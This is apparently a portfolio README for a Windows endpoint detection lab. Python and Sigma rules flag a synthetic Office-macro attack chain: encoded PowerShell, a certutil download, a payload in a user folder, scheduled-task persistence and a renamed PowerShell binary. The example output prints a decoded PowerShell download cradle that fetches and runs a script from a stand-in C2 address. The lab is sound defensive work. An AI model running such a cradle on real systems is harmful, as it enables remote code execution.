# 08 · Endpoint Process Detection Lab (Sysmon + Sigma)

> **Recruiter summary.** A **detection-engineering** lab on Windows process creation events (Sysmon Event ID 1). Six tested rules catch a malicious macro chain: Outlook → Word → cmd → **encoded PowerShell download cradle** (the tool decodes it) → **certutil download** → payload in `C:\Users\Public` → **scheduled task persistence**. The rules also catch a **renamed PowerShell** that evades name-based rules, detected through `OriginalFileName`. A legitimate SCCM script that also uses encoded PowerShell is handled with a **narrow, owned, dated allowlist**: it is suppressed, not deleted. The rules are also published as **Sigma**, validated by converting them to Splunk SPL with pySigma.
>
> **Roles:** Detection Engineer · SOC Analyst · Incident Response · Threat Hunter
> **Stack:** Python 3 · Sysmon EID 1 schema · Sigma · pySigma → Splunk · ATT&CK T1566.001, T1204.002, T1059.001, T1027.010, T1105, T1053.005, T1036.003

| Evidence | Link |
|---|---|
| Sigma rules | [sigma/](sigma) · [converted to Splunk SPL](sigma/converted_to_splunk.txt) |
| Alerts (JSON) | [output/alerts.json](output/alerts.json) |
| Allowlist with owner and review date | [data/allowlist.json](data/allowlist.json) |
| Tests (8) | [test_endpoint_lab.py](test_endpoint_lab.py) |

## ▶️ 3-minute demo
```powershell
cd soc-analyst-portfolio\08-endpoint-process-detection
python generate_sysmon.py
python detect_process.py                 # 12 rule hits: 7 active, 5 suppressed SCCM
python detect_process.py --tree WKS-0113 # the full attack chain as a process tree
python -m unittest
```
Talking points: **(1)** The process tree tells the story in one screen: a user opens an invoice from Outlook, Word starts cmd, and the decoded PowerShell downloads from 203.0.113.99. **(2)** The SCCM exclusion matches parent, user **and** decoded content, so an attacker who runs their own encoded command as SYSTEM is still caught (tested). **(3)** The renamed binary on WKS-0119 slips past the encoded-PowerShell rule, which looks at the file name; only `OriginalFileName` catches it. Each rule's blind spot is covered by another rule.

## Example output
```text
107 process events · 12 rule hits · 7 active alerts · 5 suppressed by allowlist

2026-10-22 10:17:28.000 WKS-0113  High    OFFICE_SPAWNS_SHELL  winword.exe started cmd.exe
2026-10-22 10:17:29.000 WKS-0113  High    ENCODED_POWERSHELL   encoded PowerShell command
                                         decoded: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/a.ps1')
2026-10-22 10:17:35.000 WKS-0113  High    LOLBIN_DOWNLOAD      certutil downloads a file
2026-10-22 10:17:39.000 WKS-0113  Medium  RUN_FROM_USER_PATH   executable started from a user-writable folder: C:\Users\Public\p.exe
2026-10-22 10:17:54.000 WKS-0113  Medium  SCHEDULED_TASK       scheduled task created (persistence)
2026-10-22 12:02:40.000 WKS-0119  High    RENAMED_BINARY       file is svch0st.exe but OriginalFileName is PowerShell.EXE
```

## What was tested
| Part | Status |
|---|---|
| Generator, 6 Python rules, allowlist, process tree, 8 unit tests | ✅ Executed (Python 3.13) |
| Sigma rules | ✅ Parsed and converted to SPL with pySigma 2.1 + Splunk backend; ⚠️ the SPL was **not run** in Splunk |

All events are synthetic; 203.0.113.99 is a documentation IP, the same fictional C2 seen in labs 05 and 06.
